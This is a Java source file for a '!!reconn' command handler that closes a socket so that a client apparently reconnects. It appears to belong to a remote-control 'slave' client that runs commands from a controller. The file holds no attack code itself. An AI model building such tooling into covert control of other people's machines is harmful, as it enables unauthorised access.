package top.idoknow.ghost.slave.func;

import top.idoknow.ghost.slave.cmd.AbstractFunc;
import top.idoknow.ghost.slave.cmd.AbstractProcessor;
import top.idoknow.ghost.slave.conn.HandleConn;

/**
 * 重连
 */
public class FuncReconn implements AbstractFunc {
    @Override
    public String getFuncName() {
        return "!!reconn";
    }

    @Override
    public String[] getParamsModel() {
        return new String[0];
    }

    @Override
    public String getDescription() {
        return null;
    }

    @Override
    public int getMinParamsAmount() {
        return 0;
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {
        try {
            HandleConn.closeSocket();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
